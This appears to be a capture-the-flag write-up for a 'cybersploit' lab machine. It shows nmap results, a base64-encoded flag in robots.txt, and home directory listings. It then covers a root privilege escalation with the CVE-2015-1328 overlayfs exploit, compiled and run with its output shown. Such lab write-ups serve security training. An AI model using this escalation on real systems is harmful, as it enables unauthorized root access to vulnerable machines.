# NMAP
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIvXzKChMFQjoRVJPY3oKyzdX27i0MDEbmLG3yRuSLiPgYBF4jGq+7mn848WJSbLPpNAa/6xMgQb5BhhSTHgA77kg1gS8IhXvpoMlixJoJmGVBAqobxKAEbZnfbSKfjtJk7jI9mfoZjmOhznnzEwsODjzEDqtBYGEo4Mf/9KUX/jAAAAFQCdv46IJ36Dkyv7av5KP+Ghs7TzSwAAAIAVxh4PVUljX8ECckYq40LJ/jRL4qWhLSctMRK9J34+WSe2RHpRKRB+0eTpjffzNktRgFgKJJwW+3kd4HzOROMDvLEuhdrALiiNwqxYzIv70i+mwxNWoghoUcslgXOmeTAvyiW/jNU/Uav39nutehkX62PfvTRrulRzlbayMbkU4AAAAIABwdKXqzEKdPr7L+bCBLEe06k3Vd2bWvTOD3wwGzz+rzvmcexiPvgc1xRYE6Fno0QG2yfow9cvgrajyiDoMdUVogH7N8hm3+KbaKnO8mA7jkxVMACpfanwHRVJfM/+PHPOvML2v8QJ7JYGRgwlTyI5UxqUw9YuJSNJWThRWyw49A==
|   2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAgVBhkY/5TpbZpI7WmUiKX7koUuK6+K+usitE5rg6V326mmdJKt69IFmq4gcgpqXuImopLdGczY/8ulNoEj3aaPckhAVG5CLmlGMvRR5h2AW6pI7pUI9NkyAtLkm0fkyLDKLvKS32KSQ9jSdVPeXeCE0EpGJW5J5QOMWxEbS4z3XnLlkLqGz/wPRCwupYjJ+UsAgHfJVDKC7foPZj1ft/XX9oqcNkcykxz3AQtn0sEEZ8MfuWyePiVgYmsDLl0tBGdm0p9GExfWE0KAhpScWaxJzKmSFfzAjVpg60SyegBAhcIs0xMS18cBAS05OHNLKmMCfzOqm+8AjbVAyl+RF3
|   256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPHaPjoo6jLLN7KcEqjZCEXgAdRiejIMlLihehQ7+dmmxs4SqtjA8I8EjiqZpVL6kgSmDX5BpNxmyHjWJRHIC9U=
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Hello Pentester!
```

# HTTP Port 80
![image](https://user-images.githubusercontent.com/31241187/143829673-ac96b9e3-65d1-4966-82bc-617cbe881d12.png)
![image](https://user-images.githubusercontent.com/31241187/143829693-a304113d-b845-4f80-b3c2-5fe920128960.png)
Robotx.txt
```
Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=    # cybersploit{youtube.com/c/cybersploit}
```

# local.txt
Local.txt was found on /home/itsskv/
```
itsskv@cybersploit-CTF:~$ ls -la 
total 608
drwxr-xr-x 21 itsskv itsskv   4096 Nov 29 13:56 .
drwxr-xr-x  4 root   root     4096 Jun 25  2020 ..
-rw-------  1 itsskv itsskv    344 Nov 29 13:59 .bash_history
-rw-r--r--  1 itsskv itsskv    220 Jun 25  2020 .bash_logout
-rw-r--r--  1 itsskv itsskv   3486 Jun 25  2020 .bashrc
drwx------ 14 itsskv itsskv   4096 Jun 25  2020 .cache
drwx------  9 itsskv itsskv   4096 Jun 25  2020 .config
drwx------  3 itsskv itsskv   4096 Jun 25  2020 .dbus
drwxr-xr-x  2 itsskv itsskv   4096 Jun 25  2020 Desktop
-rw-r--r--  1 itsskv itsskv     25 Jun 26  2020 .dmrc
drwxr-xr-x  2 itsskv itsskv   4096 Jun 25  2020 Documents
drwxr-xr-x  2 itsskv itsskv   4096 Jun 25  2020 Downloads
-rw-r--r--  1 itsskv itsskv   8445 Jun 25  2020 examples.desktop
-rw-rw-r--  1 itsskv itsskv     32 Sep  3  2020 flag2.txt
drwx------  3 itsskv itsskv   4096 Jun 26  2020 .gconf
drwx------  4 itsskv itsskv   4096 Jun 25  2020 .gnome2
drwx------  2 itsskv itsskv   4096 Nov 29 13:57 .gnupg
-rw-rw-r--  1 itsskv itsskv    142 Jun 26  2020 .gtk-bookmarks
drwx------  2 itsskv itsskv   4096 Jun 25  2020 .gvfs
-rw-------  1 itsskv itsskv   1062 Jun 26  2020 .ICEauthority
-rwxrwxr-x  1 itsskv itsskv 451118 Jul 23 14:40 linpeas.sh
drwxr-xr-x  3 itsskv itsskv   4096 Jun 25  2020 .local
-rw-r--r--  1 itsskv itsskv     33 Nov 29 13:27 local.txt
drwx------  3 itsskv itsskv   4096 Jun 25  2020 .mission-control
drwx------  4 itsskv itsskv   4096 Jun 25  2020 .mozilla
drwxr-xr-x  2 itsskv itsskv   4096 Jun 25  2020 Music
drwxr-xr-x  2 itsskv itsskv   4096 Jun 25  2020 Pictures
-rw-r--r--  1 itsskv itsskv    675 Jun 25  2020 .profile
drwxr-xr-x  2 itsskv itsskv   4096 Jun 25  2020 Public
drwx------  2 itsskv itsskv   4096 Jun 26  2020 .pulse
-rw-------  1 itsskv itsskv    256 Jun 25  2020 .pulse-cookie
drwxr-xr-x  2 itsskv itsskv   4096 Jun 25  2020 Templates
drwxr-xr-x  2 itsskv itsskv   4096 Jun 25  2020 Videos
-rw-------  1 itsskv itsskv      0 Jun 26  2020 .Xauthority
-rw-------  1 itsskv itsskv  12288 Jun 26  2020 .xsession-errors
```

# Priv Esc
```
itsskv@cybersploit-CTF:~$ uname -a
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux
```
[CVE-2015-1328](https://www.exploit-db.com/exploits/37292)
```
itsskv@cybersploit-CTF:~$ gcc test1.c -o test1
itsskv@cybersploit-CTF:~$ chmod 777 test1
itsskv@cybersploit-CTF:~$ ./test1
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
# ls -la /root
total 136
drwx------ 20 root root  4096 Nov 29 13:27 .
drwxr-xr-x 23 root root  4096 Sep 22  2020 ..
-rw-------  1 root root  3540 Sep 23  2020 .ICEauthority
-rw-------  1 root root     0 Sep 23  2020 .Xauthority
-rw-------  1 root root     0 Sep 23  2020 .bash_history
-rw-r--r--  1 root root  3106 Apr 19  2012 .bashrc
drwx------ 13 root root  4096 Sep  3  2020 .cache
drwx------  9 root root  4096 Sep  3  2020 .config
drwx------  3 root root  4096 Jun 27  2020 .dbus
-rw-r--r--  1 root root    25 Sep 23  2020 .dmrc
drwx------  3 root root  4096 Sep 23  2020 .gconf
drwx------  4 root root  4096 Sep  3  2020 .gnome2
-rw-r--r--  1 root root   107 Sep 23  2020 .gtk-bookmarks
drwx------  2 root root  4096 Sep  3  2020 .gvfs
drwxr-xr-x  3 root root  4096 Sep  4  2020 .local
drwx------  3 root root  4096 Sep  3  2020 .mission-control
drwx------  4 root root  4096 Sep  3  2020 .mozilla
-rw-r--r--  1 root root   140 Apr 19  2012 .profile
drwx------  2 root root  4096 Sep 23  2020 .pulse
-rw-------  1 root root   256 Jun 25  2020 .pulse-cookie
-rw-------  1 root root 11459 Sep 23  2020 .xsession-errors
-rw-------  1 root root 11011 Sep 22  2020 .xsession-errors.old
drwxr-xr-x  2 root root  4096 Sep  3  2020 Desktop
drwxr-xr-x  2 root root  4096 Sep  3  2020 Documents
drwxr-xr-x  2 root root  4096 Sep  3  2020 Downloads
drwxr-xr-x  2 root root  4096 Sep  3  2020 Music
drwxr-xr-x  2 root root  4096 Sep  3  2020 Pictures
drwxr-xr-x  2 root root  4096 Sep  3  2020 Public
drwxr-xr-x  2 root root  4096 Sep  3  2020 Templates
drwxr-xr-x  2 root root  4096 Sep  3  2020 Videos
-rw-r--r--  1 root root    32 Sep  4  2020 finalflag.txt
-rw-r--r--  1 root root    33 Nov 29 13:27 proof.txt
```
